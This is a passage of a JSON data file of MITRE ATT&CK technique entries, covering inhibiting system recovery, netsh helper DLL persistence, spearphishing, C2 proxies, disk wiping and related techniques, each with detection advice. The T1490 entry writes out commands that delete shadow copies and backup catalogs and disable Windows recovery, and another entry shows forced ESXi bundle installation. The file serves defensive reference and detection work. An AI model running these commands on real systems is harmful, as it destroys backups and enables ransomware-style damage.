      "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nOn ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation: Cybereason)\n\nAdversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1490",
      "stix_id": "attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a",
      "created": "2019-04-02T13:54:43.136000+00:00",
      "modified": "2025-04-15T19:59:22.100000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "Network Devices",
        "IaaS",
        "Containers",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Cloud Storage: Cloud Storage Deletion",
        "Command: Command Execution",
        "Service: Service Metadata",
        "Snapshot: Snapshot Deletion",
        "File: File Deletion"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, bcdedit, REAgentC, and diskshadow. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.\n\nMonitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage</code>).\n\nFor network infrastructure devices, collect AAA logging to monitor for `erase`, `format`, and `reload` commands being run in succession."
    },
    "T1546.007": {
      "id": "T1546.007",
      "name": "Netsh Helper DLL",
      "description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.007",
      "stix_id": "attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed",
      "created": "2020-01-24T14:26:51.207000+00:00",
      "modified": "2025-04-16T20:37:23.142000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Modification",
        "Module: Module Load",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software.(Citation: Demaske Netsh Persistence)"
    },
    "T1566.003": {
      "id": "T1566.003",
      "name": "Spearphishing via Service",
      "description": "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1566.003",
      "stix_id": "attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317",
      "created": "2020-03-02T19:24:00.951000+00:00",
      "modified": "2025-04-15T23:11:50.622000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. \n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts."
    },
    "T1090.001": {
      "id": "T1090.001",
      "name": "Internal Proxy",
      "description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1090.001",
      "stix_id": "attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755",
      "created": "2020-03-14T23:08:20.244000+00:00",
      "modified": "2025-04-15T19:59:22.365000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1216": {
      "id": "T1216",
      "name": "System Script Proxy Execution",
      "description": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1216",
      "stix_id": "attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:37:23.298000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files."
    },
    "T1102.001": {
      "id": "T1102.001",
      "name": "Dead Drop Resolver",
      "description": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1102.001",
      "stix_id": "attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7",
      "created": "2020-03-14T22:24:21.841000+00:00",
      "modified": "2025-04-25T14:48:36.031000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)"
    },
    "T1001.001": {
      "id": "T1001.001",
      "name": "Junk Data",
      "description": "Adversaries may add junk data to protocols used for command and control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor December 2020) By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1001.001",
      "stix_id": "attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade",
      "created": "2020-03-15T00:30:25.444000+00:00",
      "modified": "2025-04-15T19:59:22.822000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1598.001": {
      "id": "T1598.001",
      "name": "Spearphishing Service",
      "description": "Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1598.001",
      "stix_id": "attack-pattern--f870408c-b1cd-49c7-a5c7-0ef0fc496cc6",
      "created": "2020-10-02T17:08:07.742000+00:00",
      "modified": "2025-04-15T23:11:18.959000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1505.006": {
      "id": "T1505.006",
      "name": "vSphere Installation Bundles",
      "description": "Adversaries may abuse vSphere Installation Bundles (VIBs) to establish persistent access to ESXi hypervisors. VIBs are collections of files used for software distribution and virtual system management in VMware environments. Since ESXi uses an in-memory filesystem where changes made to most files are stored in RAM rather than in persistent storage, these modifications are lost after a reboot. However, VIBs can be used to create startup tasks, apply custom firewall rules, or deploy binaries that persist across reboots. Typically, administrators use VIBs for updates and system maintenance.\n\nVIBs can be broken down into three components:(Citation: VMware VIBs)\n\n* VIB payload: a `.vgz` archive containing the directories and files to be created and executed on boot when the VIBs are loaded.  \n* Signature file: verifies the host acceptance level of a VIB, indicating what testing and validation has been done by VMware or its partners before publication of a VIB. By default, ESXi hosts require a minimum acceptance level of PartnerSupported for VIB installation, meaning the VIB is published by a trusted VMware partner. However, privileged users can change the default acceptance level using the `esxcli` command line interface. Additionally, VIBs are able to be installed regardless of acceptance level by using the <code> esxcli software vib install --force</code> command. \n* XML descriptor file: a configuration file containing associated VIB metadata, such as the name of the VIB and its dependencies.  \n\nAdversaries may leverage malicious VIB packages to maintain persistent access to ESXi hypervisors, allowing system changes to be executed upon each bootup of ESXi \u2013 such as using  `esxcli` to enable firewall rules for backdoor traffic, creating listeners on hard coded ports, and executing backdoors.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022) Adversaries may also masquerade their malicious VIB files as PartnerSupported by modifying the XML descriptor file.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1505.006",
      "stix_id": "attack-pattern--f8ba7d61-11c5-4130-bafd-7c3ff5fbf4b5",
      "created": "2025-03-27T18:41:08.494000+00:00",
      "modified": "2025-04-15T21:24:04.676000+00:00",
      "platforms": [
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1552.007": {
      "id": "T1552.007",
      "name": "Container API",
      "description": "Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1552.007",
      "stix_id": "attack-pattern--f8ef3a62-3f44-40a4-abca-761ab235c436",
      "created": "2021-03-31T14:01:52.321000+00:00",
      "modified": "2025-04-15T22:09:34.621000+00:00",
      "platforms": [
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Establish centralized logging for the activity of container and Kubernetes cluster components. Monitor logs for actions that could be taken to gather credentials to container and cloud infrastructure, including the use of discovery API calls by new or unexpected users and APIs that access Docker logs.\n\nIt may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078)."
    },
    "T1584.001": {
      "id": "T1584.001",
      "name": "Domains",
      "description": "Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).(Citation: Krebs DNS Hijack 2019)\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)\n\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1584.001",
      "stix_id": "attack-pattern--f9cc4d06-775f-4ee1-b401-4e2cc0da30ba",
      "created": "2020-10-01T00:51:28.513000+00:00",
      "modified": "2025-04-15T22:22:55.487000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Domain Name: Passive DNS",
        "Domain Name: Domain Registration",
        "Domain Name: Active DNS"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    },
    "T1505.001": {
      "id": "T1505.001",
      "name": "SQL Stored Procedures",
      "description": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1505.001",
      "stix_id": "attack-pattern--f9e9365a-9ca2-4d9c-8e7c-050d73d1101a",
      "created": "2019-12-12T14:59:58.168000+00:00",
      "modified": "2025-04-15T23:02:13.653000+00:00",
      "platforms": [
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "On a MSSQL Server, consider monitoring for xp_cmdshell usage.(Citation: NetSPI Startup Stored Procedures) Consider enabling audit features that can log malicious startup activities."
    },
    "T1556.004": {
      "id": "T1556.004",
      "name": "Network Device Authentication",
      "description": "Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\n[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556.004",
      "stix_id": "attack-pattern--fa44a152-ac48-441e-a524-dd7b04b8adcd",
      "created": "2020-10-19T17:58:04.155000+00:00",
      "modified": "2025-04-15T21:40:12.055000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)\n\nDetection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601)."
    },
    "T1561.001": {
      "id": "T1561.001",
      "name": "Disk Content Wipe",
      "description": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1561.001",
      "stix_id": "attack-pattern--fb640c43-aa6b-431e-a961-a279010424ac",
      "created": "2020-02-20T22:06:41.739000+00:00",
      "modified": "2025-04-15T19:59:23.834000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Drive: Drive Modification",
        "Drive: Drive Access",
        "Driver: Driver Load",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.\n\nFor network infrastructure devices, collect AAA logging to monitor for `erase` commands that delete critical configuration files."
    },
    "T1213.005": {
      "id": "T1213.005",
      "name": "Messaging Applications",
      "description": "Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.  \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications: \n\n* Testing / development credentials (i.e., [Chat Messages](https://attack.mitre.org/techniques/T1552/008)) \n* Source code snippets \n* Links to network shares and other internal resources \n* Proprietary data(Citation: Guardian Grand Theft Auto Leak 2022)\n* Discussions about ongoing incident response efforts(Citation: SC Magazine Ragnar Locker 2021)(Citation: Microsoft DEV-0537)\n\nIn addition to exfiltrating data from messaging applications, adversaries may leverage data from chat messages in order to improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts.(Citation: Sentinel Labs NullBulge 2024)(Citation: Permiso Scattered Spider 2023)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1213.005",
      "stix_id": "attack-pattern--fb75213f-cfb0-40bf-a02f-3bad93d6601e",
      "created": "2024-08-30T13:50:42.023000+00:00",
      "modified": "2025-04-15T22:48:58.763000+00:00",
      "platforms": [
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1048.003": {
      "id": "T1048.003",
      "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
      "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1048.003",
      "stix_id": "attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b",
      "created": "2020-03-15T15:37:47.583000+00:00",
      "modified": "2025-04-15T19:59:24.041000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "File: File Access",
        "Network Traffic: Network Traffic Content",
        "Command: Command Execution",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) \n\nFor network infrastructure devices, collect AAA logging to monitor for `copy` commands being run to exfiltrate configuration files to non-standard destinations over unencrypted protocols such as TFTP."
    },
    "T1027.015": {
      "id": "T1027.015",
      "name": "Compression",
      "description": "Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https://attack.mitre.org/techniques/T1027/011)).(Citation: Trustwave Pillowmint June 2020)\n\nIn order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload.(Citation: Perception Point)\n\nFile archives may be sent as one [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) through email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e., [Malicious File](https://attack.mitre.org/techniques/T1204/002)).(Citation: NTT Security Flagpro new December 2021) However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user.(Citation: The Hacker News)\n\n[Compression](https://attack.mitre.org/techniques/T1027/015) may be used in combination with [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013) where compressed files are encrypted and password-protected.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.015",
      "stix_id": "attack-pattern--fbd91bfc-75c2-4f0c-8116-3b4e722906b3",
      "created": "2025-03-04T18:29:33.850000+00:00",
      "modified": "2025-04-15T19:59:24.125000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1574.004": {
      "id": "T1574.004",
      "name": "Dylib Hijacking",
